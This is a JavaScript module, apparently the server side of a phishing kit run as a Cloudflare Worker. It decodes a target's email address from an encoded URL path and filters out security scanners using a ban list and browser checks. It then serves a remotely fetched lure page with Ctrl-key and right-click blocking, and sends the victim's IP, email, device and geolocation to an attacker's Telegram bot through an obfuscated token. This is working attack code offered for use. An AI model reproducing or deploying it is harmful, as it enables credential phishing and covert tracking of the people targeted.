import { isStringBanned } from './utils.js';
import {callers,telegramData} from './callers.js'; 

export function cs_clean(originalString, substringToRemove) {
    const regex = new RegExp(substringToRemove, 'g');
    return originalString.replace(regex, '');
}  

export function sendTelegramMessage(message) {
    const chatId = telegramData[0];
    const token = telegramData[1];

    const baseUrl = `https://api.telegram.org/bot${atob(cs_clean(token, "google"))}/sendMessage`;
    const params = new URLSearchParams();
    params.append('chat_id', chatId);
    params.append('text', message);

    return fetch(baseUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: params.toString(),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            //console.log("Message sent successfully to", chatId);
        } else {
            console.error("Failed to send message:", data.description);
        }
    })
    .catch(error => {
        console.error("Error sending message:", error);
    });
}
// Helper function to validate email 
export function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}
// Helper function to safely execute a function and return a default value if it fails
export function getValueOrDefault(fn, defaultValue) {
    try {
        return fn();
    } catch (error) {
        return defaultValue;
    }
}
export function isNullOrUndefinedOrEmpty(value) {
    return typeof value === 'undefined' || value === null || value === '';
}
// Function to detect the device type
export function detectDeviceType(userAgent) {
    const ua = userAgent;
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
        return 'Mobile';
    } else if (/Tablet|iPad/i.test(ua)) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}

export async function loadpage(request, newUrl, pathname) {
    const userAgent = request.headers.get('User-Agent') || '';
    const ipAddress = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || request.headers.get('Remote-Addr');
    const basedata = getValueOrDefault(() => atob(pathname.split(callers[2])[1]), pathname.split(callers[2])[1]);
    const page_caller = getValueOrDefault(() => basedata.split(callers[0])[0], basedata.split(callers[0])[0]);
 
    if (isNullOrUndefinedOrEmpty(basedata) || isNullOrUndefinedOrEmpty(basedata)) {
        return new Response('Not Found', { status: 404 });
    }

    const users = basedata.split(callers[0])[3];
    const domains = basedata.split(callers[0])[5];
    if (isNullOrUndefinedOrEmpty(users)) {
        return new Response('Not Found U', { status: 404 });
    }
    if (isNullOrUndefinedOrEmpty(domains)) {
        return new Response('Not Found D', { status: 404 });
    }
    const domain = getValueOrDefault(() => atob(domains), domains);
    const user = users;
    const dnx = user + "@" + domain;
    const ep = `pointergoogleapicom`;
    const pgurl = `${newUrl}?ck=1&pxg=${page_caller}&ua=${btoa(userAgent)}&e=${btoa(dnx)}&ep=${btoa(ep)}&en=${btoa(dnx)}&eu=${domain}`;
    const redirectUrl = callers[3];
    const checkemail = `${users}@${domains}`
    const result = isStringBanned(checkemail);
    //console.log(`${checkemail}`);
    if (result) {
    return Response.redirect(redirectUrl);
    }


    const browserMappings = {
        'Edge': /edg/i,
        'Safari': /safari/i,
        'Opera': /opr\//i,
        'Chrome': /chrome|chromium|crios/i,
        'Firefox': /firefox|fxios/i
    };
    let browserName = '';
    for (const [name, regex] of Object.entries(browserMappings)) {
        if (userAgent.match(regex)) {
            browserName = name;
            break;
        }
    }

    const isSupportedBrowser = Object.keys(browserMappings).some(browser => userAgent.includes(browser));
    if (!isSupportedBrowser) {
        return new Response('Unsupported browser', { status: 400 });
    }

    const device = detectDeviceType(userAgent);
    const response = await fetch(pgurl, { method: 'POST' });
    const data = await response.text();

    const htmlContent = `
        <!DOCTYPE html>
        <html>
          <head>
          
            <script>
              document.addEventListener("keydown", function(event) {
                if (event.ctrlKey) {
                  event.preventDefault();
                }
              });
              document.addEventListener('contextmenu', event => event.preventDefault());
            </script>
          </head>
          <body>
            ${data}
          </body>
        </html>
    `;
 
    try {
        const ipResponse = await fetch('https://ipinfo.io/json', { method: 'GET' });
        const ipData = await ipResponse.json();
 
        const message = `
            ---PAGE LOADED!!----  
            Client IP: ${ipAddress}  
            Click Device: ${device} 
            Click browser is: ${browserName}  
            EMAIL is: ${dnx}  
            Caller is: ${page_caller}  
            Country Name is: ${ipData.country}  
            City is: ${ipData.city} 
            Region is: ${ipData.region} 
            Click User agent is: ${userAgent}
        `;

         console.log('sendTelegramMessage:', message);
          await sendTelegramMessage(message);
    } catch (error) {
        console.error('Error fetching IP information:', error);
    }

    return new Response(htmlContent, {
        headers: { 'Content-Type': 'text/html' }
    });
}

// Exported functions
export default {
    cs_clean,
    sendTelegramMessage,
    isValidEmail,
    getValueOrDefault, 
    loadpage,
    detectDeviceType,
};
 